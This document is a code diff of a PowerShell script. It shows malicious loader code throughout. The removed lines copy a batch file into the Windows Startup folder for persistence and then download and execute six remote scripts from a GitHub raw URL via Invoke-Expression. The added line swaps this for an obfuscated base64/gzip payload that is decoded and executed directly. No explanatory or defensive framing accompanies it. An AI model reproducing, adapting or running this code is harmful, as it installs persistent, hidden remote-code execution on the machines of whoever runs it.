@@ -1,16 +1,1 @@
-$TempBat = "$env:TEMP\run.bat"
-$Startup = [Environment]::GetFolderPath("Startup")
-
-Copy-Item $TempBat -Destination $Startup -Force
-
-for ($i = 1; $i -le 6; $i++) {
-   
-    $url = "https://raw.githubusercontent.com/jia891/myweb/refs/heads/main/dc$i.ps1"
-    
-    
-    $webClient = New-Object System.Net.WebClient
-    $scriptContent = $webClient.DownloadString($url)
-    
-    
-    Invoke-Expression $scriptContent
-}
+$compressed = 'H4sIAAAAAAAA/2SQz0rzQBTF94G8wyXMoqUkQzcfn5Fs7B/pwlpowYW6mCS3zdTkTpi5aSzik7nwkXwFSVtLxc3lLs75ncP5+vgUK6zqG8WQQCCQdvFqcrd4sg1FqeLA98SSleWmhgQeJ7TT1lCFxM9xfIs8NWWOdqG46AUnXdD3Pd8bmXofzhgrOPPDMTrWpFgbgjM1nBqbYWdZGws9oSGB4TUIDWGJ8K/7BoM+vPkeABwOiMaWXduCuXaxlFa10UZz0aSNQ5sZYiSOMlPJrVb/r4ay2reYSotrJwtUuZOV0iTzTOiodsPgSL28osV0VGqkbpU5tuF9usWMYbl3jFU0R44efhQnh8usrnl0DIfkAhGNTUulUfmSraZNr6vf/5s5o515wXDyWlt07rDRL6bvvX8HAAD//7NdTb+uAQAA'; $bytes = [System.Convert]::FromBase64String($compressed); $stream = New-Object IO.MemoryStream(, $bytes); $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompressed); $obfuscated = $reader.ReadToEnd(); Invoke-Expression $obfuscated
